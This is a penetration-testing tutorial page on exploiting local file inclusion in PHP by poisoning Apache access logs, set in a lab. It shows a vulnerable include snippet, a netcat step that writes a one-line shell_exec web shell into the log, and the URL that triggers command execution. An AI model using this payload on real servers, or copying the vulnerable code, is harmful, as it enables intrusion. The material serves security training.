---
description: Details and exploitation frameworks for local file inclusion
---

# Local File Inclusion

Local file inclusion vulnerabilities can be more difficult to exploit as they do not allow the attacker to write arbitrary code to a file and then simply execute it. Instead, the attacker must be more clever about how to get code into an execution context.

## Contaminating Log Files

One way we can try to inject code onto the server is through log file poisoning. Most application servers will log all URLs that are requested.

This can be leveraged to an attacker's advantage by submitting a request that includes PHP code. Once the request is logged, they can use the log file in their LFI payload.

### Example

Consider a webpage with the following PHP code snippet included in its `menu.php` page:

```php
<?php
    $file = $_GET["file"];
    include $file; ?>
```

Clearly this parameter can be manipulated to allow for LFI. Unfortunately, in this example the attacker cannot upload files to the server (thus eliminating the ability to upload a custom PHP executable and reach it via the LFI). Instead the attacker will attempt an HTTP request (containing a PHP payload) to the server in the hopes the server writes the payload the the log and the LFI can be leveraged in that way.

<table><thead><tr><th width="207.33333333333331">Machine</th><th>IP Address</th></tr></thead><tbody><tr><td>Victim (Web Server)</td><td><code>10.11.0.22</code></td></tr><tr><td>Attacker</td><td><code>10.11.0.4</code></td></tr></tbody></table>

#### &#x20;Attacker Machine

From the attacker's machine they will initiate a connection with the vulnerable server via Netcat. After the connection is made the attacker will send an HTTP request where the "request" is actually a PHP payload.

```bash
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

HTTP/1.1 400 Bad Request
```

First, notice that the entire payload is written in PHP: it begins with `<?php` and ends with `?>`. The bulk of the PHP payload is a simple `echo` command that will print output to the page. This output is first wrapped in `pre` HTML tags, which preserve any line breaks or formatting in the results of the function call. Next is the function call itself, `shell_exec`, which will execute an OS command. Finally, the OS command is retrieved from the `cmd` parameter of the GET request with `_GET[‘cmd’]`. This one line of PHP will let the attacker specify an OS command via the query string and output the results in the browser.

While the request obviously failed as an invalid request, the server logged it as a requested URL.

#### Victim Machine

While the victim's machine will generally be more opaque to the attacker, for example purposes assume the logs can be viewed.

The "bad request" was logged in the Apache access files as shown below in the exceprt from the victims `C:\xampp\apache\logs\access.log` file:

{% code lineNumbers="true" %}
```
10.11.0.4 - - [30/Nov/2019:13:55:12 -0500] "GET /css/bootstrap.min.css HTTP/1.1" 200 155758 "http://10.11.0.22/menu.php?file=\\Windows\\System32\\drivers\\etc\\hosts" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.11.0.4 - - [30/Nov/2019:13:58:07 -0500] "GET /tacotruck.php HTTP/1.1" 200 1189 "http://10.11.0.22/menu.php?file=/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.11.0.4 - - [30/Nov/2019:14:01:41 -0500] ""<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>\n" 400 981 "-" "-"
```
{% endcode %}

With the payload successfully included in a file on the server the attacker can now move to exploitation.

#### Attacker Machine

The attacker can then query the menu page and include the log file as the `file` parameter and a `cmd` parameter of their choice:

All the attacker has to do is navigate to the URL `http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`

The browser will render the page and the bottom of the page should include the output of the `ipconfig` command.

<figure><img src="../../.gitbook/assets/LFI_ExecutionExample.png" alt=""><figcaption><p>Successfully executed LFI with command output</p></figcaption></figure>

Because of the PHP `include` statement and the attacker's ability to specify a file via LFI, the contents of the contaminated `access.log` file were executed by the web page.

The PHP engine runs the `<?php echo shell_exec($_GET[‘cmd’]);?>` portion of the log file’s text (our payload) with the `cmd` variable’s value of `"ipconfig"`, essentially running `ipconfig` on the target and displaying the output. The additional lines in the log file are simply displayed because they do not contain valid PHP code.
